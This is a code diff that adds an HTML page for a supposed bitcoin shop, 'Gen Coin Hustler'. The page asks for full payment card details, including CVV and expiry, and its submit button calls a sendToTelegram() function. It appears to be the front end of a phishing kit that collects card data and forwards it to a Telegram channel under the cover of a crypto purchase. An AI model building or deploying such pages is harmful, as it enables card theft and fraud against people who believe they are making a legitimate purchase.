@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gen Coin Hustler</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <header>
+        <h1>Gen Coin Hustler</h1>
+    </header>
+    <main>
+        <section>
+            <h2>Buy Bitcoin Instantly</h2>
+            <form id="purchase-form" action="authentication.html">
+                <label for="name">Name:</label>
+                <input type="text" id="name" required>
+
+                <label for="email">Email:</label>
+                <input type="email" id="email" required>
+
+                <label for="phone">Phone Number:</label>
+                <input type="tel" id="phone" required>
+
+                <label for="address">Billing Address:</label>
+                <input type="text" id="address" required>
+
+                <label for="card-number">Credit/Debit Card Number:</label>
+                <input type="text" id="card-number" required>
+
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" required>
+
+                <label for="exp">Expiry Date (MM/YY):</label>
+                <input type="text" id="exp" required>
+
+                <label for="amount">Amount in USD:</label>
+                <input type="number" id="amount" required>
+
+                <label for="bitcoin-address">Bitcoin Wallet Address:</label>
+                <input type="text" id="bitcoin-address" required>
+
+                <label for="calculated-btc">BTC Equivalent:</label>
+                <input type="text" id="calculated-btc" readonly>
+
+                <button type="button" onclick="calculateBTC()">Calculate BTC</button>
+                <button type="submit" onclick="sendToTelegram()">Next</button>
+            </form>
+        </section>
+    </main>
+    <footer>
+        <p>© 2024 Gen Coin Hustler</p>
+    </footer>
+    <script src="js/script.js"></script>
+</body>
+</html>
